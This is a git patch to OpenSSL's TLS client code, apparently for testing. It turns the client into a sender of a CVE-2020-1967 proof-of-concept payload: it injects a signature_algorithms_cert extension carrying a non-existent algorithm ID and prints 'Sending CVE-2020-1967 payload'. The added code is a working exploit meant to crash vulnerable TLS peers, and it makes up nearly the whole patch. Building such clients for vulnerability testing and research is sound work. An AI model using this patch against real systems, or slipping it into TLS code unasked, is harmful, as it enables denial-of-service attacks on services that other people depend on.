From 24aca2aa16365ee54e2fc318389075b3f3d28ff0 Mon Sep 17 00:00:00 2001
From: ripples <564311873@qq.com>
Date: Tue, 5 May 2020 21:42:06 +0800
Subject: [PATCH] patched

---
 ssl/statem/extensions_clnt.c | 23 +++++++++++++++++++++++
 1 file changed, 23 insertions(+)

diff --git a/ssl/statem/extensions_clnt.c b/ssl/statem/extensions_clnt.c
index f0ae642..ec061ae 100644
--- a/ssl/statem/extensions_clnt.c
+++ b/ssl/statem/extensions_clnt.c
@@ -272,6 +272,29 @@ EXT_RETURN tls_construct_ctos_sig_algs(SSL *s, WPACKET *pkt,
         return EXT_RETURN_NOT_SENT;
 
     salglen = tls12_get_psigalgs(s, 1, &salg);
+
+
+/*
+// signature_algorithms_cert
+*/
+    const uint16_t non_existent = 0x1234;
+    fprintf(stderr,"Sending CVE-2020-1967 payload\n");
+    if (!WPACKET_put_bytes_u16(pkt, TLSEXT_TYPE_signature_algorithms_cert)
+               // Sub-packet for sig-algs extension
+            || !WPACKET_start_sub_packet_u16(pkt)
+               // Sub-packet for the actual list
+            || !WPACKET_start_sub_packet_u16(pkt)
+            || (!WPACKET_put_bytes_u16(pkt, non_existent))
+            || !WPACKET_close(pkt)
+            || !WPACKET_close(pkt)) {
+        SSLfatal(s, SSL_AD_INTERNAL_ERROR, SSL_F_TLS_CONSTRUCT_CTOS_SIG_ALGS,
+                 ERR_R_INTERNAL_ERROR);
+        return EXT_RETURN_FAIL;
+    }
+
+/*
+// original signature_algorithms:
+*/
     if (!WPACKET_put_bytes_u16(pkt, TLSEXT_TYPE_signature_algorithms)
                /* Sub-packet for sig-algs extension */
             || !WPACKET_start_sub_packet_u16(pkt)
-- 
2.25.1
